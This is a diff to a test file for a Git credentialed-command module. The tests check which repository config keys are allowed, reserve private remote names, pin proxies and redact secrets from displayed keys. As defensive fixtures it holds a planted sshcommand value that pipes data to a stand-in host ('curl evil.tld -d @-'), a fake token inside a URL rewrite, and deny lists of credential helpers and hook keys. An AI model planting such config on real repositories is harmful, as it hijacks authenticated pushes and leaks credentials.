@@ -2,10 +2,14 @@ import { describe, expect, it } from 'vitest';
 import {
 	credentialedCommandEntries,
 	credentialedProtocol,
+	displayConfigKey,
+	effectiveRemoteUrls,
 	foreignRepositoryConfig,
 	isAllowedRepositoryConfigKey,
 	parseScopedConfigList,
 	privateRemoteName,
+	recoveryHint,
+	RESERVED_REMOTE_PREFIX,
 	type ScopedConfigEntry
 } from '../credentialed-command.js';
 
@@ -63,11 +67,19 @@ describe('privateRemoteName', () => {
 		for (const name of names) expect(name).toMatch(/^ew-credentialed-[0-9a-f-]{36}$/);
 	});
 
-	it('is a name the allowlist would accept a section for — which is why it has to be unguessable', () => {
-		// `remote.<plain name>.url` is allowed (people add remotes). So the
-		// only thing between a planted section and the credentialed command
-		// is that the name does not exist until the command does.
-		expect(isAllowedRepositoryConfigKey(`remote.${privateRemoteName()}.url`)).toBe(true);
+	it('is RESERVED: no config file may hold a section for one, whatever the section says', () => {
+		// `remote.<plain name>.url` is allowed (people add remotes), and a
+		// private name is a plain name. Unguessable is true BEFORE the command
+		// runs; while it runs the name is in its argv. So the prefix itself is
+		// off limits, in any spelling Git would match.
+		const name = privateRemoteName();
+		expect(name.startsWith(RESERVED_REMOTE_PREFIX)).toBe(true);
+		for (const variable of ['url', 'pushurl', 'fetch', 'proxy', 'proxyauthmethod', 'promisor']) {
+			expect(isAllowedRepositoryConfigKey(`remote.${name}.${variable}`)).toBe(false);
+		}
+		expect(isAllowedRepositoryConfigKey('remote.EW-Credentialed-anything.url')).toBe(false);
+		// The same variables on an ordinary remote are fine.
+		expect(isAllowedRepositoryConfigKey('remote.upstream.url')).toBe(true);
 	});
 });
 
@@ -160,7 +172,45 @@ describe('the allowlist — what the repository’s own config may carry', () =>
 		'push.default',
 		'transfer.fsckobjects',
 		'extensions.worktreeconfig',
-		'core.sparsecheckout'
+		'core.sparsecheckout',
+		// What Git writes itself after `fetch --filter` / `worktree add
+		// --relative-paths`.
+		'extensions.partialclone',
+		'extensions.relativeworktrees',
+		'remote.origin.promisor',
+		'remote.origin.partialclonefilter',
+		// Programs and switches for a terminal user: an agent that runs `git
+		// config core.editor true` must not lose every later publish for it.
+		'core.editor',
+		'core.pager',
+		'sequence.editor',
+		'pager.fetch',
+		'pager.log',
+		'color.pager',
+		'color.ui',
+		'i18n.commitencoding',
+		'i18n.logoutputencoding',
+		'alias.co',
+		'alias.fetch',
+		// Drivers that run when content is checked out, merged or shown.
+		'diff.external',
+		'diff.pdf.textconv',
+		'diff.pdf.command',
+		'merge.ours.driver',
+		'merge.tool',
+		'mergetool.vscode.cmd',
+		'mergetool.keepbackup',
+		'difftool.vscode.cmd',
+		'filter.custom.clean',
+		// Signing: the credentialed push is pinned unsigned.
+		'gpg.format',
+		'gpg.program',
+		'gpg.ssh.program',
+		'gpg.ssh.defaultkeycommand',
+		'gpg.ssh.allowedsignersfile',
+		'push.gpgsign',
+		// Overridden for the credentialed push.
+		'push.negotiate'
 	])('allows %s', (key) => {
 		expect(isAllowedRepositoryConfigKey(key)).toBe(true);
 	});
@@ -181,29 +231,27 @@ describe('the allowlist — what the repository’s own config may carry', () =>
 		'remote.origin.receivepack',
 		'remote.origin.vcs',
 		'remote.origin.proxy',
-		'remote.origin.promisor',
-		'remote.origin.partialclonefilter',
-		// Programs.
+		'remote.origin.proxyauthmethod',
+		// The reserved prefix of the private remotes.
+		'remote.ew-credentialed-00000000-0000-4000-8000-000000000000.url',
+		'remote.ew-credentialed-00000000-0000-4000-8000-000000000000.proxy',
+		// Programs a fetch or a push CAN be made to start.
 		'core.sshcommand',
 		'core.gitproxy',
 		'core.askpass',
 		'core.alternaterefscommand',
-		'core.editor',
-		'core.pager',
 		'core.unsetenvvars',
 		'core.worktree',
 		'gc.recentobjectshook',
 		'pack.someobjectshook',
-		'diff.external',
-		'diff.pdf.textconv',
-		'diff.pdf.command',
-		'merge.ours.driver',
-		'gpg.program',
-		'gpg.ssh.program',
-		'pager.fetch',
-		'alias.fetch',
-		'sequence.editor',
 		'uploadpack.packobjectshook',
+		// The guard on the inert sections still holds outside the named
+		// exceptions: a program-shaped variable nobody has classified.
+		'diff.pdf.somehook',
+		'merge.ours.program',
+		'color.editor',
+		'gc.pager',
+		'interactive.difffilter',
 		// Where the request goes and whom it trusts.
 		'credential.helper',
 		'credential.https://github.com.helper',
@@ -226,12 +274,10 @@ describe('the allowlist — what the repository’s own config may carry', () =>
 		// What pulls other config in, or other objects.
 		'include.path',
 		'includeif.gitdir:/x/.path',
-		'extensions.partialclone',
 		'fetch.bundleuri',
 		'promisor.advertise',
-		// Signing and recursion a push could be talked into.
-		'push.gpgsign',
-		'push.negotiate',
+		'extensions.somethingnew',
+		// What a push could be talked into.
 		'push.pushoption',
 		// Anything nobody has heard of.
 		'ewunknown.setting',
@@ -301,6 +347,8 @@ describe('credentialedCommandEntries — what a credentialed child is given at e
 		expect(entries.get('push.gpgSign')).toBe('false');
 		expect(entries.get('fetch.recurseSubmodules')).toBe('false');
 		expect(entries.get('push.recurseSubmodules')).toBe('no');
+		// A negotiating push fetches BY URL first; see the attack spec.
+		expect(entries.get('push.negotiate')).toBe('false');
 		// Git for Windows' own default: nothing else is unset for its children.
 		expect(entries.get('core.unsetenvvars')).toBe('PERL5LIB');
 	});
@@ -394,10 +442,45 @@ describe('credentialedCommandEntries — what a credentialed child is given at e
 		expect(entriesFor([], env).get(`http.${URL_HTTPS}.proxy`)).toBe(expected);
 	});
 
+	it('pins the proxy on the PRIVATE REMOTE too — a remote’s proxy outranks http.<url>.proxy', () => {
+		// `http.c` takes `remote.<name>.proxy` over `http.proxy` when the remote
+		// has one, and the name is in the command's argv while it runs. So the
+		// value the http pin carries is put on the remote itself, last in
+		// config order.
+		const none = entriesFor([]);
+		expect(none.get('remote.ew-credentialed-test.proxy')).toBe('');
+		expect(none.get('remote.ew-credentialed-test.proxyAuthMethod')).toBe('anyauth');
+
+		const fromEnvironment = entriesFor([], { https_proxy: 'http://lower:1' });
+		expect(fromEnvironment.get('remote.ew-credentialed-test.proxy')).toBe('http://lower:1');
+		expect(fromEnvironment.get(`http.${URL_HTTPS}.proxy`)).toBe('http://lower:1');
+
+		const operators = entriesFor([
+			scoped('global', 'http.proxy', 'http://proxy.corp:8080'),
+			scoped('global', 'http.proxyauthmethod', 'negotiate'),
+			local('remote.ew-credentialed-test.proxy', 'http://evil:1'),
+			local('http.proxyauthmethod', 'basic')
+		]);
+		expect(operators.get('remote.ew-credentialed-test.proxy')).toBe('http://proxy.corp:8080');
+		expect(operators.get('remote.ew-credentialed-test.proxyAuthMethod')).toBe('negotiate');
+	});
+
+	it('does not put a proxy on the private remote when the operator’s own are per URL', () => {
+		// It would REPLACE whichever of them Git's URL matching picks.
+		const entries = entriesFor([
+			scoped('global', 'http.https://github.com/.proxy', 'http://gh-proxy.corp:3128'),
+			scoped('global', 'http.https://github.com/.proxyauthmethod', 'ntlm')
+		]);
+
+		expect(entries.has('remote.ew-credentialed-test.proxy')).toBe(false);
+		expect(entries.has('remote.ew-credentialed-test.proxyAuthMethod')).toBe(false);
+	});
+
 	it('adds no connection settings for a repository on disk', () => {
 		const entries = entriesFor([], {}, 'file:///srv/git/repo.git');
 
 		expect([...entries.keys()].some((key) => key.startsWith('http.'))).toBe(false);
+		expect([...entries.keys()].some((key) => key.endsWith('.proxy'))).toBe(false);
 		expect(entries.get('remote.ew-credentialed-test.url')).toBe('file:///srv/git/repo.git');
 		expect(entries.get('core.alternateRefsCommand')).toBe('');
 	});
@@ -412,5 +495,165 @@ describe('credentialedCommandEntries — what a credentialed child is given at e
 		});
 
 		expect(JSON.stringify(entries)).not.toContain('Authorization');
+	});
+});
+
+describe('displayConfigKey — how a key may be shown', () => {
+	it.each([
+		['core.sshcommand', 'core.sshcommand'],
+		['credential.helper', 'credential.helper'],
+		['url.https://user:ghp_secret@evil.tld/.insteadof', 'url.<…>.insteadof'],
+		['http.https://github.com/o/r.git.extraheader', 'http.<…>.extraheader'],
+		['credential.https://github.com.helper', 'credential.<…>.helper'],
+		['weird section!.thing', '<…>.thing']
+	])('%s → %s', (key, shown) => {
+		expect(displayConfigKey(key)).toBe(shown);
+	});
+});
+
+describe('recoveryHint — the way out of a refusal', () => {
+	const POOL = 'C:\\fleet\\repos\\abc123.git';
+
+	it('gives the exact unset for a key that has no subsection', () => {
+		expect(recoveryHint(['core.sshcommand', 'include.path'], POOL)).toBe(
+			'To clear it on this machine: ' +
+				'git -C "C:/fleet/repos/abc123.git" config --unset-all core.sshcommand; ' +
+				'git -C "C:/fleet/repos/abc123.git" config --unset-all include.path'
+		);
+	});
+
+	it('gives the command that LISTS the full names for a key whose subsection is not shown', () => {
+		// The subsection is never printed, so it cannot be in the command
+		// either: the operator lists the names on the machine and unsets those.
+		expect(recoveryHint(['remote.<…>.uploadpack', 'remote.<…>.url'], '/srv/fleet/repos/abc.git')).toBe(
+			'To clear it on this machine: ' +
+				'git -C "/srv/fleet/repos/abc.git" config --show-origin --name-only --get-regexp ' +
+				'"^remote\\..*\\.uploadpack$|^remote\\..*\\.url$" ' +
+				'(lists the full names; then git -C "/srv/fleet/repos/abc.git" config --unset-all <name> for each)'
+		);
+	});
+
+	it('gives both when both kinds are named', () => {
+		const hint = recoveryHint(['core.sshcommand', 'url.<…>.insteadof'], '/p.git');
+
+		expect(hint).toContain('git -C "/p.git" config --unset-all core.sshcommand; ');
+		expect(hint).toContain('--get-regexp "^url\\..*\\.insteadof$"');
+	});
+
+	it('falls back to listing everything for a name it cannot put in a command', () => {
+		expect(recoveryHint(['<…>.thing'], '/p.git')).toBe(
+			'To clear it on this machine: ' +
+				'git -C "/p.git" config --show-origin --show-scope --list --name-only ' +
+				'(lists the full names; then git -C "/p.git" config --unset-all <name> for each)'
+		);
+	});
+
+	it('is built from the displayed names only — nothing it prints can be a subsection or a value', () => {
+		const names = foreignRepositoryConfig([
+			local('url.https://user:ghp_secretInASubsection@evil.tld/.insteadof', 'https://github.com/'),
+			local('core.sshcommand', 'curl evil.tld -d @-')
+		]);
+
+		const hint = recoveryHint(names, '/p.git');
+
+		expect(hint).not.toContain('ghp_secretInASubsection');
+		expect(hint).not.toContain('evil.tld');
+		expect(hint).not.toContain('curl');
+	});
+});
+
+describe('effectiveRemoteUrls — the URL git will really use', () => {
+	const GITHUB = 'https://github.com/ever-works/ever-works.git';
+
+	it('is the URL itself when nothing rewrites it', () => {
+		expect(effectiveRemoteUrls([scoped('global', 'user.name', 'x')], GITHUB)).toEqual({
+			fetch: GITHUB,
+			push: GITHUB,
+			fetchRule: null,
+			pushRule: null
+		});
+	});
+
+	it('applies insteadOf to the fetch AND the push, and names the key and scope — not the value', () => {
+		const urls = effectiveRemoteUrls(
+			[scoped('global', 'url.ssh://git@github.com/.insteadof', 'https://github.com/')],
+			GITHUB
+		);
+
+		expect(urls.fetch).toBe('ssh://git@github.com/ever-works/ever-works.git');
+		expect(urls.push).toBe('ssh://git@github.com/ever-works/ever-works.git');
+		expect(urls.fetchRule).toEqual({ key: 'url.<…>.insteadof', scope: 'global' });
+		expect(urls.pushRule).toEqual({ key: 'url.<…>.insteadof', scope: 'global' });
+	});
+
+	it('applies pushInsteadOf to the push only', () => {
+		const urls = effectiveRemoteUrls(
+			[scoped('system', 'url.ssh://git@github.com/.pushinsteadof', 'https://github.com/')],
+			GITHUB
+		);
+
+		expect(urls.fetch).toBe(GITHUB);
+		expect(urls.fetchRule).toBeNull();
+		expect(urls.push).toBe('ssh://git@github.com/ever-works/ever-works.git');
+		expect(urls.pushRule).toEqual({ key: 'url.<…>.pushinsteadof', scope: 'system' });
+	});
+
+	it('lets pushInsteadOf rewrite the ORIGINAL url, not the one insteadOf produced', () => {
+		const urls = effectiveRemoteUrls(
+			[
+				scoped('global', 'url.ssh://git@github.com/.insteadof', 'https://github.com/'),
+				scoped('global', 'url.ssh://other/.pushinsteadof', 'https://github.com/ever-works/')
+			],
+			GITHUB
+		);
+
+		expect(urls.fetch).toBe('ssh://git@github.com/ever-works/ever-works.git');
+		expect(urls.push).toBe('ssh://other/ever-works.git');
+	});
+
+	it('takes the LONGEST matching prefix, whatever the order', () => {
+		const urls = effectiveRemoteUrls(
+			[
+				scoped('system', 'url.ssh://short/.insteadof', 'https://github.com/'),
+				scoped('global', 'url.ssh://long/.insteadof', 'https://github.com/ever-works/'),
+				scoped('global', 'url.ssh://unrelated/.insteadof', 'https://gitlab.com/')
+			],
+			GITHUB
+		);
+
+		expect(urls.fetch).toBe('ssh://long/ever-works.git');
+		expect(urls.fetchRule?.scope).toBe('global');
+	});
+
+	it('breaks a tie the way git does: base by base, in the order the bases first appear', () => {
+		const urls = effectiveRemoteUrls(
+			[
+				scoped('global', 'url.ssh://first/.insteadof', 'https://example.invalid/'),
+				scoped('global', 'url.ssh://second/.insteadof', 'https://github.com/'),
+				scoped('global', 'url.ssh://first/.insteadof', 'https://github.com/')
+			],
+			GITHUB
+		);
+
+		expect(urls.fetch).toBe('ssh://first/ever-works/ever-works.git');
+	});
+
+	it('is case-sensitive about the prefix, as git is', () => {
+		const urls = effectiveRemoteUrls(
+			[scoped('global', 'url.ssh://git@github.com/.insteadof', 'https://GitHub.com/')],
+			GITHUB
+		);
+
+		expect(urls.fetch).toBe(GITHUB);
+	});
+
+	it('reads every scope — a rewrite is a rewrite wherever it is written', () => {
+		const urls = effectiveRemoteUrls(
+			[scoped('command', 'url.file:///local/.insteadof', 'https://github.com/')],
+			GITHUB
+		);
+
+		expect(urls.fetch).toBe('file:///local/ever-works/ever-works.git');
+		expect(urls.fetchRule?.scope).toBe('command');
 	});
 });
